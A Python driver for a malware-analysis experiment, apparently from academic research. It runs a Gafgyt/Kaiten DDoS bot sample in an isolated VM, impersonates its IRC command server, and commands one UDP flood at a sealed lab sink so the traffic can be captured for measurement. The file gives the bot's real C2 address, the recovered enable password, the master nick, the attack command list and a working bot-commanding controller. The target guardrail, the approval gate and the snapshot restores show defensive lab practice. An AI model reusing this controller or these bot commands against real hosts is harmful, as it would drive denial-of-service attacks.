"""Phase 3 of the bot-flooding experiment: COMMAND the Kaiten bot to UDP-flood the isolated Sink and capture the flood.

Builds on Phase 2 (handshake captured: channel #bots, key channelkey, nick [KEK|x86_64]..). Here the in-guest lab IRC
controller completes registration, sends `ENABLE FreakIsYourGod!!!` (the `dispass` password recovered by static
analysis of the binary's enable() -> strcasecmp against dispass), waits for "Password correct."/"Enabled and awaiting
orders", then issues exactly ONE flood command `UDP 10.0.0.1 <port> <secs>` targeting ONLY the isolated Sink. A host
tcpdump on enp0s3 records the flood (the C2 channel is on lo, so enp0s3 shows only the guest->Sink flood, uncontaminated).

SAFETY (hard): the controller REFUSES to transmit any attack command whose target is not exactly the Sink 10.0.0.1;
the guest is intnet-only (no route off the sealed malnet); the bot runs non-root (basic UDP sendto flood, no raw-socket
spoofing); the VM is restored to the original snapshot and powered off afterwards. This is a bounded flood-VIABILITY
check (does the bot flood the Sink when commanded, and what is the flow shape); it is NOT the collector-telemetry run
(that is Phase 4, which tunes flood intensity so the .21 collector captures host+P4 features without eBPF overflow).
Reuses the Phase-2 VM choreography (export_original_sources.helper_module/wait_guest + collect_v21 .21 pins).
"""
import argparse
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))
import export_original_sources as exp   # noqa: E402  helper_module/wait_guest/check_competitors + VM pattern
import collect_v21 as v21               # noqa: E402  .21-pinned verify_production + BASELINE
import collect_v19 as frozen            # noqa: E402  digest/save/load/stamp/require

STUDY = frozen.STUDY
digest, save, load, stamp = frozen.digest, frozen.save, frozen.load, frozen.stamp
COHORT = "data/malware/full-cohort-323/samples"
KAITEN_SHA = "478053ea93052dd3f1477cf497443c0cb1b0e75361ba3927b929b707c18f35e2"
C2_IP = "45.61.164.81"          # the bot's hardcoded C2, aliased to lo so the control channel stays in-guest
C2_PORT = 6667
SINK = "10.0.0.1"               # the ONLY permitted flood target (isolated INetSim Sink on malnet)
ENABLE_PASS = "FreakIsYourGod!!!"   # dispass, recovered by static analysis of enable()/strcasecmp
FLOOD_PORT = 65003
FLOOD_SECS = 15
WINDOW = 50                     # seconds to keep the bot+controller alive (register+enable+flood+margin)

# ---- in-guest IRC controller: registers the bot, ENABLEs, sends ONE Sink-only flood command ----
CONTROLLER_SRC = r'''
import socket, sys, time, json, threading
port = int(sys.argv[1]); logpath = sys.argv[2]; enable_pass = sys.argv[3]; flood_cmd = sys.argv[4]; sink = sys.argv[5]
logf = open(logpath, "a", buffering=1)
state = {"found": False, "channel": None, "flood_sent": False, "blocked": False}
MASTER = "Freak"   # a configured master nick (ismaster gate); the bot only obeys a master, addressed with a nick pattern
ATTACK = {"UDP","TCP","STD","HTTP","HOLD","JUNK","PAN","PHATWONK","BLACKNURSE","UNKNOWN","GET","SCANNER","KILLALL","KILLATTK","DNS","STOP"}
def rec(d, raw): logf.write(json.dumps({"t": time.time(), "dir": d, "raw": raw}) + "\n")
def send(conn, s):
    body = s.split(" :", 1)[1] if " :" in s else ""
    toks = body.split()
    for i, t in enumerate(toks):                       # any attack verb (anywhere) must target exactly the Sink
        if t.upper() in ATTACK:
            tgt = toks[i + 1] if i + 1 < len(toks) else ""
            if tgt != sink:
                state["blocked"] = True; rec("BLOCKED", s); return False
    conn.sendall((s + "\r\n").encode("latin-1", "replace")); rec("S->C", s); return True
def keepalive(conn):                                   # keep the bot's recv fed so it does not idle-timeout+reconnect
    while True:
        time.sleep(1.5)
        try: conn.sendall(b"PING :lab\r\n")
        except Exception: return
def commander(conn, channel):
    time.sleep(1.0)                                    # send ENABLE promptly, before the bot's recv-timeout reconnect
    src = ":%s!%s@lab" % (MASTER, MASTER)              # command must come FROM a master and be addressed to the bot (*)
    send(conn, "%s PRIVMSG %s :* ENABLE %s" % (src, channel, enable_pass))
    t0 = time.time()
    while time.time() - t0 < 12 and not state["found"]: time.sleep(0.3)
    if not state["found"]:
        rec("INFO", "ENABLE not confirmed; NOT sending flood"); return
    sent = send(conn, "%s PRIVMSG %s :* %s" % (src, channel, flood_cmd))
    state["flood_sent"] = bool(sent)
    rec("INFO", ("flood command issued: " if sent else "flood command BLOCKED: ") + flood_cmd)
def handle(conn):
    conn.settimeout(WINDOW_HINT); nick=None; registered=False; joined=False; ka=[False]; buf=b""
    while True:
        try: data = conn.recv(4096)
        except socket.timeout: break
        if not data: break
        buf += data
        while b"\n" in buf:
            line, buf = buf.split(b"\n", 1)
            text = line.decode("latin-1").rstrip("\r")
            if not text: continue
            rec("C->S", text); low = text.lower()
            if ("password correct" in low) or ("awaiting orders" in low) or ("already enabled" in low):
                state["found"] = True; rec("INFO", "ENABLE accepted")
            parts = text.split(); cmd = parts[0].upper() if parts else ""
            if cmd == "NICK" and len(parts) > 1: nick = parts[1].lstrip(":")
            elif cmd == "USER":                         # (re-)send welcome on every USER so a re-register recovers
                n = nick or "bot"
                for num, msg in (("001","Welcome"),("002","your host is lab"),("003","created"),
                                 ("004","lab lab 1.0 o o"),("375","- MOTD -"),("372","- lab -"),("376","End of MOTD")):
                    send(conn, ":lab %s %s :%s" % (num, n, msg))
                registered = True
                if not ka[0]:
                    ka[0] = True
                    threading.Thread(target=keepalive, args=(conn,), daemon=True).start()
            elif cmd == "CAP": send(conn, ":lab CAP * LS :")
            elif cmd == "PING":
                arg = text.split(" ", 1)[1] if " " in text else ":lab"
                send(conn, "PONG %s" % arg)
            elif cmd == "JOIN" and len(parts) > 1:
                ch = parts[1].lstrip(":").split(",")[0]; state["channel"] = ch
                send(conn, ":%s!%s@lab JOIN :%s" % (nick, nick, ch))
                send(conn, ":lab 353 %s = %s :%s @op" % (nick, ch, nick))
                send(conn, ":lab 366 %s %s :End of names" % (nick, ch))
                if not joined:
                    joined = True
                    threading.Thread(target=commander, args=(conn, ch), daemon=True).start()
            elif cmd == "WHO" and len(parts) > 1:   # the bot blocks waiting for its own WHO reply; answer 352+315
                who = parts[1]; ch = state.get("channel") or "#bots"
                send(conn, ":lab 352 %s %s %s 10.0.0.10 lab %s H :0 %s" % (nick, ch, who, nick, who))
                send(conn, ":lab 315 %s %s :End of /WHO list." % (nick, who))
    rec("INFO", "client disconnected")
WINDOW_HINT = 120
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port)); s.listen(5); s.settimeout(WINDOW_HINT)
    rec("INFO", "listening on %d; flood_cmd=%r sink=%s" % (port, flood_cmd, sink))
    try:
        while True:
            try: conn, addr = s.accept()
            except socket.timeout: break
            rec("INFO", "connection from %s" % (addr,))
            threading.Thread(target=handle, args=(conn,), daemon=True).start()
    finally:
        json.dump(state, open(logpath + ".summary", "w"))
main()
'''

# ---- in-guest orchestrator: alias C2, start tcpdump(enp0s3), controller, run bot for WINDOW, tear down ----
ORCH_SRC = r'''
import json, os, signal, socket, subprocess, sys, time, glob, hashlib
(sample_zip, controller_py, pwfile, c2ip, port, sink, enable_pass, flood_cmd,
 window, outdir, floodpcap) = sys.argv[1:12]
port = int(port); window = int(window)
os.makedirs(outdir, exist_ok=True)
result = {"steps": {}, "errors": []}
def sudo(args):
    p = subprocess.run(["sudo","-S","-p",""]+args, input=pw+"\n", text=True,
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    return p.returncode, p.stdout
pw = open(pwfile).read().strip()
# 1) extract bot
ed = os.path.join(outdir, "bot"); os.makedirs(ed, exist_ok=True)
ex = subprocess.run(["/usr/bin/7z","x","-pinfected","-o"+ed,"-y",sample_zip],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
result["steps"]["extract_rc"] = ex.returncode
files = [f for f in glob.glob(ed+"/*") if os.path.isfile(f)]
if not files:
    result["errors"].append("no extracted file"); print(json.dumps(result)); sys.exit(1)
bot = files[0]; result["bot_sha256"] = hashlib.sha256(open(bot,"rb").read()).hexdigest(); os.chmod(bot, 0o755)
# 2) alias C2 on lo (control channel stays in-guest)
rc, _ = sudo(["/usr/sbin/ip","addr","add",c2ip+"/32","dev","lo"]); result["steps"]["alias_rc"] = rc
chk = subprocess.run(["/usr/sbin/ip","addr","show","dev","lo"], stdout=subprocess.PIPE, text=True).stdout
result["alias_present"] = c2ip in chk
# 3) start tcpdump on enp0s3 (root), capturing the flood to the Sink
td = subprocess.Popen(["sudo","-S","-p","","/usr/bin/tcpdump","-i","enp0s3","-n","-U","-w",floodpcap],
                      stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, text=True)
td.stdin.write(pw+"\n"); td.stdin.close()
time.sleep(2)
# 4) start controller (command mode)
clog = os.path.join(outdir, "c2.jsonl")
ctrl = subprocess.Popen(["/usr/bin/python3", controller_py, str(port), clog, enable_pass, flood_cmd, sink],
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
time.sleep(1.5)
try:
    t = socket.create_connection((c2ip, port), timeout=3); t.close(); result["listener_ok"] = True
except OSError as e:
    result["listener_ok"] = False; result["errors"].append("listener: " + str(e))
# 5) run the bot; keep it alive for the full window (it daemonizes; the launcher exits ~immediately)
botout = open(os.path.join(outdir,"bot.out"), "wb")
proc = subprocess.Popen([bot], cwd=ed, stdin=subprocess.DEVNULL, stdout=botout, stderr=subprocess.STDOUT,
                        preexec_fn=os.setsid)
time.sleep(2)
result["launcher_exit"] = proc.poll()
time.sleep(window)   # register + ENABLE + flood happen here
# 6) tear down: kill bot child(ren), controller, tcpdump
base = os.path.basename(bot)
subprocess.run(["pkill","-9","-f",base], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
sudo(["pkill","-INT","-x","tcpdump"]); time.sleep(2)
try: ctrl.send_signal(signal.SIGINT)
except Exception: pass
time.sleep(1)
try: ctrl.kill()
except Exception: pass
# 7) make the pcap retrievable (tcpdump wrote it as root)
sudo(["/bin/chown", os.environ.get("USER","csci"), floodpcap]); sudo(["/bin/chmod","0644",floodpcap])
result["flood_pcap_bytes"] = os.path.getsize(floodpcap) if os.path.exists(floodpcap) else 0
# 8) collect c2 log + summary
log = []
if os.path.exists(clog):
    for ln in open(clog):
        ln = ln.strip()
        if ln:
            try: log.append(json.loads(ln))
            except Exception: pass
result["c2_events"] = log
result["c2_summary"] = json.load(open(clog + ".summary")) if os.path.exists(clog + ".summary") else {}
try: os.remove(pwfile)
except Exception: pass
sudo(["/usr/sbin/ip","addr","del",c2ip+"/32","dev","lo"])
print(json.dumps(result))
'''


def flood_command():
    return "UDP %s %d %d" % (SINK, FLOOD_PORT, FLOOD_SECS)


def freeze():
    v21.verify_production()
    helper = exp.helper_module()
    run_id = stamp()
    attempt = ROOT / "gafgyt-phase3" / run_id
    attempt.mkdir(parents=True, exist_ok=False)
    sample = STUDY / COHORT / (KAITEN_SHA + ".zip")
    frozen.require(sample.is_file(), "missing Kaiten sample")
    (attempt / "labctl.py").write_text(CONTROLLER_SRC)
    (attempt / "orchestrate.py").write_text(ORCH_SRC)
    subprocess.run(["python3", "-c", "import ast,sys; ast.parse(open(sys.argv[1]).read()); ast.parse(open(sys.argv[2]).read())",
                    str(attempt / "labctl.py"), str(attempt / "orchestrate.py")], check=True)
    protocol = {
        "format": "gafgyt-phase3-flood-viability-v1",
        "purpose": "command the Kaiten bot (ENABLE + UDP flood) against the isolated Sink and capture the flood on "
                   "enp0s3; bounded viability, NOT the collector-telemetry run",
        "sample_sha256": KAITEN_SHA, "sample_family": "Gafgyt/Kaiten-Ziggy-Qbot-Redo",
        "c2_endpoint": {"ip": C2_IP, "port": C2_PORT, "bound_as": "lo alias"},
        "enable_password": ENABLE_PASS, "flood_command": flood_command(),
        "flood_target": SINK, "flood_port": FLOOD_PORT, "flood_seconds": FLOOD_SECS, "window_seconds": WINDOW,
        "baseline_snapshot": v21.BASELINE, "baseline_uuid": v21.BASELINE_UUID, "original_snapshot": helper.ORIGINAL,
        "production_hashes": v21.PINNED, "guest_user": helper.GUEST_USER,
        "controller_sha256": digest(attempt / "labctl.py"), "orchestrator_sha256": digest(attempt / "orchestrate.py"),
        "driver_sha256": digest(Path(__file__)), "attack_commanded": True, "attack_target_restricted_to": SINK,
        "sink_untouched": True, "approval": None,
        "limitations": [
            "The flood is commanded ONLY against the isolated Sink 10.0.0.1 on the sealed malnet; the controller "
            "refuses any non-Sink target. Guest is intnet-only; snapshot restore wipes the bot afterwards.",
            "Bot runs non-root -> basic UDP sendto flood (no raw-socket source spoofing).",
            "Viability + flow-shape only; telemetry (host syscalls + P4) via the .21 collector is Phase 4, which must "
            "tune flood intensity so the eBPF buffer does not overflow (prior floods lost millions of events)."]}
    save(attempt / "protocol.json", protocol)
    print(json.dumps({"attempt": str(attempt), "protocol_sha256": digest(attempt / "protocol.json"),
                      "flood_command": flood_command(), "enable_password": ENABLE_PASS}, indent=2))
    return attempt


def analyze(pcap_path):
    """Host-side flood measurement from the retrieved enp0s3 PCAP (offline, no VM)."""
    from scapy.all import rdpcap, IP, UDP, TCP, ICMP   # noqa: E402
    pkts = rdpcap(str(pcap_path))
    udp_to_sink, sizes, times, dports = 0, [], [], set()
    icmp_from_sink, other = 0, 0
    for p in pkts:
        if IP not in p:
            other += 1; continue
        ip = p[IP]
        if UDP in p and ip.dst == SINK:
            udp_to_sink += 1; sizes.append(len(p)); times.append(float(p.time)); dports.add(int(p[UDP].dport))
        elif ICMP in p and ip.src == SINK:
            icmp_from_sink += 1
        else:
            other += 1
    span = (max(times) - min(times)) if len(times) > 1 else 0.0
    return {"total_frames": len(pkts), "udp_to_sink": udp_to_sink, "icmp_from_sink": icmp_from_sink,
            "other_frames": other, "flood_span_s": round(span, 3),
            "flood_pps": round(udp_to_sink / span, 1) if span > 0 else None,
            "udp_payload_min": min(sizes) if sizes else None, "udp_payload_max": max(sizes) if sizes else None,
            "distinct_dst_ports": len(dports)}


def run(attempt, approval):
    frozen.require(approval and approval.strip(), "A verbatim user approval is required for this VM phase")
    attempt = Path(attempt)
    if not attempt.is_absolute():
        attempt = (ROOT / attempt).resolve()
    protocol = load(attempt / "protocol.json")
    helper = exp.helper_module()
    v21.verify_production()
    destination = attempt / "run"
    destination.mkdir(parents=True, exist_ok=False)
    save(destination / "authorization.json", {"approval": approval, "phase": "flood-viability",
         "authorized_utc": datetime.now(timezone.utc).isoformat(), "flood_target": SINK,
         "flood_command": protocol["flood_command"]})
    import fcntl
    with (Path(helper.__file__).parent / "readiness.lock").open("a") as lock:
        fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
        exp.check_competitors()
        before = {"guest": helper.isolated(helper.VM), "sink": helper.isolated("Sink")}
        frozen.require(before["guest"]["VMState"] == '"poweroff"' and before["sink"]["VMState"] == '"running"'
                       and before["guest"]["CurrentSnapshotName"] == '"' + helper.ORIGINAL + '"',
                       "Expected original clean powered-off guest and running isolated Sink")
        save(destination / "initial_vm_state.json", before)
        base = "/tmp/labp3-" + attempt.name + "-"
        gfpcap = base + "flood.pcap"
        result = {"status": "failed_preserved"}
        touched = False
        try:
            with tempfile.NamedTemporaryFile(mode="w", prefix="hazim-p3-") as password:
                os.chmod(password.name, 0o600)
                password.write(helper.credentials()); password.flush()
                auth = ["--username", helper.GUEST_USER, "--passwordfile", password.name]
                touched = True
                helper.vbox("snapshot", helper.VM, "restore", protocol["baseline_snapshot"])
                state = helper.isolated(helper.VM)
                frozen.require(state["CurrentSnapshotName"] == '"' + protocol["baseline_snapshot"] + '"',
                               "Restored baseline differs")
                exp.wait_guest(helper, auth, destination / "guest-login.log")
                with tempfile.NamedTemporaryFile(mode="w", prefix="hazim-p3pw-") as gpw:
                    os.chmod(gpw.name, 0o600); gpw.write(helper.credentials()); gpw.flush()
                    for src, dst in [(str(attempt / "labctl.py"), base + "labctl.py"),
                                     (str(attempt / "orchestrate.py"), base + "orchestrate.py"),
                                     (str(STUDY / COHORT / (KAITEN_SHA + ".zip")), base + "sample.zip"),
                                     (gpw.name, base + "pbot")]:
                        cp = helper.vbox("guestcontrol", helper.VM, "copyto", *auth, src, dst, check=False)
                        frozen.require(cp.returncode == 0,
                                       "copyto %s failed rc=%s: %s" % (dst, cp.returncode, (cp.stderr or "")[:300]))
                orch = helper.vbox("guestcontrol", helper.VM, "run", *auth, "--exe", "/usr/bin/python3",
                    "--wait-stdout", "--wait-stderr", "--timeout", str((WINDOW + 180) * 1000), "--",
                    base + "orchestrate.py", base + "sample.zip", base + "labctl.py", base + "pbot",
                    C2_IP, str(C2_PORT), SINK, ENABLE_PASS, flood_command(), str(WINDOW), base + "out", gfpcap,
                    check=False)
                (destination / "orchestrator.stdout").write_text(orch.stdout)
                (destination / "orchestrator.stderr").write_text(orch.stderr)
                frozen.require(orch.returncode == 0,
                               "orchestrator rc=%s stderr=%s" % (orch.returncode, (orch.stderr or "")[-400:]))
                data = json.loads(orch.stdout.strip().splitlines()[-1])
                save(destination / "orchestrator_result.json", data)
                cf = helper.vbox("guestcontrol", helper.VM, "copyfrom", *auth, gfpcap, str(destination / "flood.pcap"),
                                 check=False)
                frozen.require(cf.returncode == 0, "copyfrom flood.pcap failed: %s" % (cf.stderr or "")[:300])
                measured = analyze(destination / "flood.pcap")
                summ = data.get("c2_summary", {})
                result = {"status": "passed", "launcher_exit": data.get("launcher_exit"),
                          "alias_present": data.get("alias_present"), "listener_ok": data.get("listener_ok"),
                          "bot_sha256_ok": data.get("bot_sha256") == KAITEN_SHA,
                          "enable_accepted": summ.get("found"), "flood_sent": summ.get("flood_sent"),
                          "controller_blocked_nonsink": summ.get("blocked"),
                          "flood_measured": measured, "flood_pcap_bytes": data.get("flood_pcap_bytes"),
                          "errors": data.get("errors", [])}
                save(destination / "result.json", result)
        except BaseException as error:
            result["error"] = type(error).__name__ + ": " + str(error)
            save(destination / "result.json", result)
            raise
        finally:
            if touched:
                if helper.vm_info(helper.VM)["VMState"] != '"poweroff"':
                    helper.vbox("controlvm", helper.VM, "poweroff")
                helper.vbox("snapshot", helper.VM, "restore", helper.ORIGINAL)
                final = {"guest": helper.isolated(helper.VM), "sink": helper.isolated("Sink")}
                save(destination / "final_vm_state.json", final)
                frozen.require(final["guest"]["VMState"] == '"poweroff"'
                               and final["guest"]["CurrentSnapshotName"] == '"' + helper.ORIGINAL + '"',
                               "Phase-3 cleanup incomplete")
    v21.verify_production()
    print(json.dumps(result, indent=2))
    return result


def self_test():
    """Local-only: drive the command-mode controller with a simulated bot; confirm ENABLE + Sink-only flood + guardrail."""
    import threading
    with tempfile.TemporaryDirectory() as td:
        td = Path(td); (td / "labctl.py").write_text(CONTROLLER_SRC)
        sock = socket.socket(); sock.bind(("127.0.0.1", 0)); port = sock.getsockname()[1]; sock.close()
        log = td / "c2.jsonl"
        # case A: flood target == Sink -> command must be sent after ENABLE accepted
        ctrl = subprocess.Popen(["python3", str(td / "labctl.py"), str(port), str(log),
                                 ENABLE_PASS, "UDP 10.0.0.1 65003 3", SINK])
        try:
            time.sleep(1.0)
            bot = socket.create_connection(("127.0.0.1", port), timeout=5); bot.settimeout(30)
            bot.sendall(b"NICK [KEK|x86_64]zz\r\nUSER zz localhost localhost :zz\r\n")
            buf = b""; joined = False; enabled = False; flood_seen = False; enable_seen = False
            deadline = time.time() + 30
            while time.time() < deadline:
                try: data = bot.recv(4096)
                except socket.timeout: break
                if not data: break
                buf += data
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1); text = line.decode("latin-1").rstrip("\r"); up = text.upper()
                    if " 376 " in text and not joined:
                        bot.sendall(b"JOIN #bots :channelkey\r\n"); joined = True
                    if text.startswith("PING"):
                        bot.sendall(("PONG %s\r\n" % text.split(" ",1)[1]).encode())
                    if "PRIVMSG" in text and "ENABLE" in up and ENABLE_PASS.upper() in up:
                        enable_seen = True; enabled = True
                        bot.sendall(b":b!b@h NOTICE op :Password correct.\r\n"
                                    b":b!b@h NOTICE op :Enabled and awaiting orders\r\n")
                    if "PRIVMSG" in text and "UDP 10.0.0.1" in up:
                        flood_seen = True
                if flood_seen: break
            bot.close()
        finally:
            time.sleep(1); ctrl.send_signal(2); time.sleep(0.3); ctrl.kill(); ctrl.wait()
        summ = json.loads((Path(str(log) + ".summary")).read_text())
        assert enable_seen, "controller never sent ENABLE"
        assert flood_seen and summ["flood_sent"], "controller did not issue the Sink flood after ENABLE"
        assert not summ["blocked"], "a Sink-targeted flood was wrongly blocked"
        # case B: non-Sink target -> must be blocked, never sent
        log2 = td / "c2b.jsonl"
        sock = socket.socket(); sock.bind(("127.0.0.1", 0)); port2 = sock.getsockname()[1]; sock.close()
        ctrl2 = subprocess.Popen(["python3", str(td / "labctl.py"), str(port2), str(log2),
                                  ENABLE_PASS, "UDP 8.8.8.8 65003 3", SINK])
        try:
            time.sleep(1.0)
            bot = socket.create_connection(("127.0.0.1", port2), timeout=5); bot.settimeout(30)
            bot.sendall(b"NICK [KEK|x86_64]zz\r\nUSER zz localhost localhost :zz\r\n")
            buf=b""; joined=False; bad_flood=False; deadline=time.time()+20
            while time.time() < deadline:
                try: data = bot.recv(4096)
                except socket.timeout: break
                if not data: break
                buf += data
                while b"\n" in buf:
                    line, buf = buf.split(b"\n",1); text=line.decode("latin-1").rstrip("\r"); up=text.upper()
                    if " 376 " in text and not joined:
                        bot.sendall(b"JOIN #bots :channelkey\r\n"); joined=True
                    if "PRIVMSG" in text and "ENABLE" in up:
                        bot.sendall(b":b!b@h NOTICE op :Password correct.\r\n:b!b@h NOTICE op :Enabled and awaiting orders\r\n")
                    if "PRIVMSG" in text and "UDP 8.8.8.8" in up: bad_flood=True
            bot.close()
        finally:
            time.sleep(1); ctrl2.send_signal(2); time.sleep(0.3); ctrl2.kill(); ctrl2.wait()
        summ2 = json.loads((Path(str(log2) + ".summary")).read_text())
        assert not bad_flood and summ2["blocked"] and not summ2["flood_sent"], "non-Sink flood was NOT blocked!"
    print("self-test OK: ENABLE+Sink-flood sent for 10.0.0.1; non-Sink (8.8.8.8) flood blocked")


def main():
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--self-test", action="store_true")
    p.add_argument("--freeze-only", action="store_true")
    p.add_argument("--run", action="store_true")
    p.add_argument("--attempt")
    p.add_argument("--approval")
    a = p.parse_args()
    if a.self_test: self_test()
    elif a.freeze_only: freeze()
    elif a.run: run(a.attempt, a.approval)
    else: p.error("one of --self-test / --freeze-only / --run required")


if __name__ == "__main__":
    main()
